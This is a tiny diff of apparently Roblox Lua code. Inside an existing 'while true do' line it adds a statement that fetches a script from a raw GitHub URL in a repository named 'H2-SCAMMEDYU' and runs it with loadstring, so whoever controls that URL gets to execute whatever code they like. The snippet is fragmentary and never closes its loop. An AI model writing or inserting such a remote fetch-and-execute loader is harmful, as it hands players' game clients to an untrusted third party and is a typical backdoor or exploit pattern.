@@ -1,1 +1,2 @@
 while true do
+loadstring(game:HttpGet("https://raw.githubusercontent.com/H2-SCAMMEDYU/change1/main/change1"))()
